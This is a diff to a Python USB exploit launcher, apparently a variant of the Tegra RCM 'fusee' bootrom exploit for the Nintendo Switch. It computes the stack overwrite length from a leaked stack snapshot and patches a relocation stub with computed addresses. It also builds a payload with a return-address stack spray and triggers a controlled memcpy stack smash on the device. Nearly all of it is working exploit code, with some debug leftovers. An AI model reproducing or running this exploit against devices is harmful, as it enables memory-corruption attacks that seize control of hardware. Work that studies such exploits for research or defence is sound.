@@ -488,6 +488,9 @@ class RCMHax:
 
         # Grab a connection to the USB device itself.
         self.dev = self._find_device(vid, pid)
+        # self.dev = "lol"
+
+        self.overwrite_len = None
 
         # If we don't have a device...
         if self.dev is None:
@@ -581,6 +584,20 @@ class RCMHax:
     def read_stack(self):
         return self.backend.read_ep0(0x10)
 
+    def get_overwrite_length(self):
+        # overwrite_len = 0x00004f20
+        if self.overwrite_len is None:
+            stack_snapshot = self.read_stack()
+            print("Stack snapshot: {}".format(binascii.hexlify(stack_snapshot)))
+            EndpointStatus_stack_addr = struct.unpack('<I', stack_snapshot[0xC:0xC+4])[0]
+            print("EndpointStatus_stack_addr: 0x{:08x}".format(EndpointStatus_stack_addr))
+            ProcessSetupPacket_SP = EndpointStatus_stack_addr - 0xC
+            print("ProcessSetupPacket SP: 0x{:08x}".format(ProcessSetupPacket_SP))
+            InnerMemcpy_LR_stack_addr = ProcessSetupPacket_SP - 2 * 4 - 2 * 4
+            print("InnerMemcpy LR stack addr: 0x{:08x}".format(InnerMemcpy_LR_stack_addr))
+            self.overwrite_len = InnerMemcpy_LR_stack_addr - 0x40005000
+            print("overwrite_len: 0x{:08x}".format(self.overwrite_len))
+        return self.overwrite_len
 
     def switch_to_highbuf(self):
         """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """
@@ -594,11 +611,45 @@ class RCMHax:
 
         # Determine how much we'd need to transmit to smash the full stack.
         if length is None:
-            length = self.STACK_END - self.get_current_buffer_address()
+            # length = self.STACK_END - self.get_current_buffer_address()
+            length = self.get_overwrite_length()
 
         print("sending status request with length {}".format(length))
 
         return self.backend.trigger_vulnerability(length)
+
+    def get_overwite_payload_off(self, intermezzo_size):
+        overwrite_len = self.get_overwrite_length()
+        return overwrite_len - 4 - intermezzo_size
+
+    def get_payload_first_length(self, intermezzo_size, payload_length):
+        overwrite_payload_off = self.get_overwite_payload_off(intermezzo_size)
+        print("overwrite_payload_off: 0x{:08x}".format(overwrite_payload_off))
+        return min(payload_length, overwrite_payload_off)
+
+    def get_payload_second_length(self, intermezzo_size, payload_length):
+        return max(0, payload_length - self.get_payload_first_length(intermezzo_size, payload_length))
+
+    def get_patched_intermezzo(self, intermezzo_bin, payload_length):
+        overwrite_len = self.get_overwrite_length()
+        intermezzo_start_addr_magic = struct.pack('<I', 0x50004000)
+        intermezzo_start_addr_off = intermezzo_bin.find(intermezzo_start_addr_magic)
+        intermezzo_start_addr = RCM_PAYLOAD_ADDR
+        intermezzo_reloc_addr = self.COPY_BUFFER_ADDRESSES[0]
+        payload_first_length = self.get_payload_first_length(len(intermezzo_bin), payload_length)
+        print("payload_first_length: 0x{:08x}".format(payload_first_length))
+        payload_second_length = self.get_payload_second_length(len(intermezzo_bin), payload_length)
+        print("payload_second_length: 0x{:08x}".format(payload_second_length))
+
+        patched_vals = struct.pack('<IIII',
+            intermezzo_start_addr, intermezzo_reloc_addr,
+            payload_first_length, payload_second_length)
+
+        print(binascii.hexlify(patched_vals))
+        patched_intermezzo_bin = intermezzo_bin[:intermezzo_start_addr_off] + patched_vals + intermezzo_bin[intermezzo_start_addr_off + len(patched_vals):]
+
+        return patched_intermezzo_bin
+
 
 
 def parse_usb_id(id):
@@ -638,26 +689,31 @@ except IOError as e:
     print(e)
     sys.exit(-1)
 
+intermezzo = None
+intermezzo_size = None
+with open(intermezzo_path, "rb") as f:
+    intermezzo = f.read()
+    intermezzo_size = len(intermezzo)
+target_payload = None
+target_payload_size = None
+with open(payload_path, "rb") as f:
+    target_payload = f.read()
+    target_payload_size = len(target_payload)
+
 # Print the device's ID. Note that reading the device's ID is necessary to get it into
 try:
     device_id = switch.read_device_id()
+    # device_id = b'0000'
     print("Found a Tegra with Device ID: {}".format(binascii.hexlify(device_id)))
 except OSError as e:
     # Raise the exception only if we're not being permissive about ID reads.
     if not arguments.permissive_id:
         raise e
 
-stack_snapshot = switch.read_stack()
-print("Stack snapshot: {}".format(binascii.hexlify(stack_snapshot)))
-EndpointStatus_stack_addr = struct.unpack('<I', stack_snapshot[0xC:0xC+4])[0]
-print("EndpointStatus_stack_addr: 0x{:08x}".format(EndpointStatus_stack_addr))
-ProcessSetupPacket_SP = EndpointStatus_stack_addr - 0xC
-print("ProcessSetupPacket SP: 0x{:08x}".format(ProcessSetupPacket_SP))
-InnerMemcpy_LR_stack_addr = ProcessSetupPacket_SP - 2 * 4 - 2 * 4
-print("InnerMemcpy LR stack addr: 0x{:08x}".format(InnerMemcpy_LR_stack_addr))
-overwrite_len = InnerMemcpy_LR_stack_addr - 0x40005000
-print("overwrite_len: 0x{:08x}".format(overwrite_len))
-
+patched_intermezzo = switch.get_patched_intermezzo(intermezzo, target_payload_size)
+with open("intermezzo_patched.bin", "wb") as f:
+    f.write(patched_intermezzo)
+# sys.exit(0)
 
 # Prefix the image with an RCM command, so it winds up loaded into memory
 # at the right location (0x40010000).
@@ -682,49 +738,23 @@ print("Payload offset of intermezzo: 0x{:08x}".format(len(payload)))
 
 # Include the Intermezzo binary in the command stream. This is our first-stage
 # payload, and it's responsible for relocating the final payload to 0x40010000.
-intermezzo_size = 0
-with open(intermezzo_path, "rb") as f:
-    intermezzo      = f.read()
-    intermezzo_size = len(intermezzo)
-    payload        += intermezzo
+payload += patched_intermezzo
+payload_first_length = switch.get_payload_first_length(intermezzo_size, target_payload_size)
+payload += target_payload[:payload_first_length]
 
-print("Payload offset of padding before user payload: 0x{:08x}".format(len(payload)))
+overwrite_payload_off = switch.get_overwite_payload_off(intermezzo_size)
+smash_padding = 0
+if payload_first_length < overwrite_payload_off:
+    smash_padding = overwrite_payload_off - payload_first_length + 4
+print("smash_padding: 0x{:08x}".format(smash_padding))
+# payload += b'\0' * smash_padding
 
-# Pad the payload till the start of the user payload.
-padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
-print("padding_size: 0x{:08x}".format(padding_size))
-payload += (b'\0' * padding_size)
+payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * 0x4000)
 
-target_payload = b''
+payload_second_length = switch.get_payload_second_length(intermezzo_size, target_payload_size)
 
-# Read the user payload into memory.
-with open(payload_path, "rb") as f:
-    target_payload = f.read()
-
-print("Payload offset of user payload first part: 0x{:08x}".format(len(payload)))
-
-# Fit a collection of the payload before the stack spray...
-padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
-print("padding_size: 0x{:08x}".format(padding_size))
-payload += target_payload[:padding_size]
-
-if len(target_payload) < padding_size:
-    padding_size   = padding_size - len(target_payload)
-    print("small payload padding_size: 0x{:08x}".format(padding_size))
-    payload += (b'\0' * padding_size)
-
-print("Payload offset of stack spray: 0x{:08x}".format(len(payload)))
-
-# ... insert the stack spray...
-repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
-payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
-
-print("Payload offset user payload second part 0x{:08x}".format(len(payload)))
-
-# ... and follow the stack spray with the remainder of the payload.
-payload += target_payload[padding_size:]
-
-print("Payload offset of remaining RCM padding 0x{:08x}".format(len(payload)))
+if payload_second_length > 0:
+    payload += target_payload[payload_first_length:]
 
 # Pad the payload to fill a USB request exactly, so we don't send a short
 # packet and break out of the RCM loop.
@@ -732,7 +762,10 @@ payload_length = len(payload)
 padding_size   = USB_XFER_MAX - (payload_length % USB_XFER_MAX)
 payload += (b'\0' * padding_size)
 
-print("Payload offset of end of payload 0x{:08x}".format(len(payload)))
+with open("payload.bin", "wb") as f:
+    f.write(payload)
+with open("payload_no_header.bin", "wb") as f:
+    f.write(payload[RCM_HEADER_SIZE:])
 
 # Check to see if our payload packet will fit inside the RCM high buffer.
 # If it won't, error out.
@@ -740,6 +773,8 @@ if len(payload) > length:
     size_over = len(payload) - length
     print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
     sys.exit(errno.EFBIG)
+
+# sys.exit(0)
 
 # Send the constructed payload, which contains the command, the stack smashing
 # values, the Intermezzo relocation stub, and the final payload.
@@ -753,7 +788,7 @@ switch.switch_to_highbuf()
 # Smash the device's stack, triggering the vulnerability.
 print("Smashing the stack...")
 try:
-    switch.trigger_controlled_memcpy(overwrite_len)
+    switch.trigger_controlled_memcpy()
 except ValueError as e:
     print(str(e))
 except IOError:
